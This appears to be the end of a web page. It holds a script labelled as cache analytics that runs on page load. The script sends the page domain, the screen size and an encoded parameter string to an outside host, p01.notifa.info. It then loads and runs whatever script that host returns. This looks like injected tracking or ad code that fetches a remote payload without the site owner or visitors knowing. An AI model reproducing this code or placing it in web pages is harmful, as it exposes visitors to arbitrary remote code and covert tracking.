<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2fb1NPxikK27XbEeQe2FGmnLeBjnovgbhZBBfqfwgvP7WSCcMnUwiHq%2fe4Lr1YGXaW9fdnPvFAs2fFwByaU%2bOt4XyXlybtmW6jGlv0leChyBc4ZlZUMEq0s0AtmXPN0oR24HOPmvobnlzFHkLLgtqhByKEz%2brffM%2bKmFhj%2bQgnErkRAgK3y386Wd5AEgr%2bLP57P0%2fSpSnJHqRrzWmUGHZ%2bSJdPfVQQUy%2fodY%2bXp5EyH9pZ%2bIzzqSYcCnx1y13xv%2bb1PK6KBlN0mafn4o7WhfuKvGDtfNzSnlQ3se0hHjpkHvaCWTxe3zaNGiM%2bf9LAiom%2fQDS84whkMVFIIIdI9ebjn%2fUFhr1u3LJzziTlodQS2FfiM%2b4BTgwQDfhm8Zcwu%2bm8KmQIqQkSjvU6CsdP%2bxq9JK5jTkoOKdFfxP%2f0APnD13k5QbZQWTplINdcmxqTYueLULKCADMyuVzq0HTJyon8%2bzSRlup3OSXKIZZ7WfehW%2fycnnI4w%2bsLDpz%2fFK9stNV1tpZXC4W0HIWa4gi3zgdO6X9gtzDwpeVy6qjSCXQTrJh21hhW2HtOg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>
</body>

</html>